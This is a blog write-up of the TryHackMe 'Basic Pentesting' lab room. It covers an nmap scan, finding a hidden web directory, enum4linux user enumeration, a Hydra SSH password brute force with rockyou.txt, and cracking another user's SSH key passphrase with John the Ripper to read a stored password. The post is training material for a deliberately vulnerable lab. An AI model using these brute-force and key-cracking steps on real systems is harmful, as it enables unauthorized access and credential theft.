---
title: "How to Warm Up my HACKING skills with TryHackMe"
date: "2020-04-23T14:17:03Z"
author: Jorge
categories:
- hack 
tags:
- hack
toc: true
summary: |
  TryHackMe is an online platform for learning and teaching cyber security.
  It is based on completing rooms and upskill in security, all from your browser.
  This is my writeup for the Basic pentesting room.
---


I have the feeling that the core of the last few articles is related to **_pentesting_** and **_hacking_**. But after discussing about integration patterns, coding and best practices all day long in my job I fond myself enjoying the hacking challenges in my spare time.

TryHackMe is an online platform for learning and teaching cyber security. It is based on completing rooms and upskill in security, all from your browser.

This article is a **Writeups** for the  [_Basic Pentesting_ room](https://tryhackme.com/room/basicpentestingjt).

{{< figure src="/img/2020/03/image.png" >}}

**1️. Deploy the machine and connect to our network**

**2️. Find the services exposed by the machine**

```bash
$ nmap -sC -sV <IP>
```

```bash
# Nmap 7.80 scan initiated Sun Mar 22 11:26:39 2020 as: nmap -sC -sV -oN output/nmap 10.10.38.196
Nmap scan report for 10.10.38.196
Host is up (0.077s latency).
Not shown: 997 closed ports
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 db:45:cb:be:4a:8b:71:f8:e9:31:42:ae:ff:f8:45:e4 (RSA)
|   256 09:b9:b9:1c:e0:bf:0e:1c:6f:7f:fe:8e:5f:20:1b:ce (ECDSA)
|_  256 a5:68:2b:22:5f:98:4a:62:21:3d:a2:e2:c5:a9:f7:c2 (ED25519)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: BASIC2; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h19m59s, deviation: 2h18m34s, median: -1s
|_nbstat: NetBIOS name: BASIC2, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery:
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: basic2
|   NetBIOS computer name: BASIC2\x00
|   Domain name: \x00
|   FQDN: basic2
|_  System time: 2020-03-22T06:26:54-04:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2020-03-22T10:26:54
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Mar 22 11:26:58 2020 -- 1 IP address (1 host up) scanned in 19.80 seconds
```

We  have 3 Open PORTS:

* 22 (SSH)
* 139 and 445 (smbd)

If we open this IP in the browser we see a server sunning.

{{< figure src="/img/2020/03/image-6.png" >}}

{{< figure src="/img/2020/03/image-2.png" >}}

**3. What is the name of the hidden directory on the web server(enter name without /)?**

```html
<!-- Check our dev note section if you need to know what to worck on. -->
```

We could use [gobuster](https://github.com/OJ/gobuster) to search for directories with brute-force but since we have a hint here let's try it first... ok `/dev` isn't the directory we are looking for but we see an apache server running. Maybe `/development` is the right endpoint... Yes, we nailed it.

{{< figure src="/img/2020/03/image-5.png" >}}

{{< figure src="/img/2020/03/image-7.png" >}}

{{< figure src="/img/2020/03/image-8.png" >}}

**4. User brute-forcing to find the username & password**

**5. What is the username?**

We have smbd open, that can give us a lot of information. We can use Enum4linux for that. Since I don't have the tool installed on my machine and handling all the dependencies may be a nightmare let's use docker.

```bash
$ docker run --rm -it enum4linux -a <IP>
```

2 users pop up, **jan** a.k.a. J and **kay** a.k.a. K.

**6. What is the password? + 7. What service do you use to access the server(answer in abbreviation in all caps)?**

Seen the input field we can assume the password is pretty simple, a brute force approach should unlock it.

We have the information about the open ports thanks the nmap tool. SSH is a great candidate with a tool called **_[Hydra](https://tools.kali.org/password-attacks/hydra)_**. A common password dictionary is needed tho and we are going to use [rockyou.txt](https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt)

Rockyou.txt contains 14,341,564 unique passwords, used in 32,603,388 accounts.

Kali Linux provides this dictionary file as part of its standard installation.

```bash
$ hydra -l jan -P rockyou.txt ssh:<ip>

login: jan   password: armando
```

**8. Enumerate the machine to find any vectors for privilege escalation**

**9. What is the name of the other user you found(all lower case)?**

We already have this information from point 5.

**10. If you have found another user, what can you do with this information? + 11. What is the final password you obtain?**

Awesome, now we can login with SSH as `jan` . Listing the file in jan directory doesn’t give us any answer to escalating the privilege. Still, remember we have the user kay? Let’s find it out.

We found the `id_rsa` and `id_rsa.pub` and a strange file `pass.back`, unfortunately when we try to ssh using the key file we see the key requires a passphrase.

```bash
$ ssh -i id_rsa kay@<IP>

Enter passphrase for key 'id_rsa':
```

But luckily we can cat out this file and crack the key with [JohnTheRipper](https://github.com/magnumripper/JohnTheRipper/blob/bleeding-jumbo/run/ssh2john.py)

```bash
$ ssh2john.py output/kay/id_rsa > id_rsa.txt

$ docker run -it --rm -v $(pwd)/id_rsa.txt:/opt/id_rsa.txt -v $(pwd)/dic/rockyou.txt:/opt/rockyou.txt obscuritylabs/johntheripper /opt/id_rsa.txt --wordlist=/opt/rockyou.txt
...
beeswax   (output/kay/id_rsa)
```

Now we can login as kay with the public key and cat the strange file we saw under the home directory for this user.

```bash
$ ssh -i id_rsa kay@<IP>

$ cat pass.back

heresareallystrongpasswordthatfollowsthepasswordpolicy$$
```

> The stream is in **Spanish**

{{< youtube UK9YkhEI4CU >}}
